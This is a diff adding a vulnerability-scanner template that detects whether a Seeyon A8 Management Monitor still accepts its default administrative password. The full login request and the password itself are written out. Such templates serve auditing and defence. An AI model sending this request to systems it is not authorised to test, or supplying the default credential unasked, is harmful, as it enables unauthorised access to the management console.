@@ -1,0 +1,34 @@
+id: seeyon-oa-monitor-default-login
+
+info:
+  name: Seeyon A8 Management Monitor - Default Login
+  author: seeyon
+  severity: high
+  tags: seeyon,oa,default-login
+
+http:
+  - raw:
+      - |
+        POST /seeyon/management/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        password=WLCCYBD%40SEEYON
+
+    host-redirects: true
+    max-redirects: 2
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<title>A8 Management Monitor</title>"
+          - "Connection Pooling"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
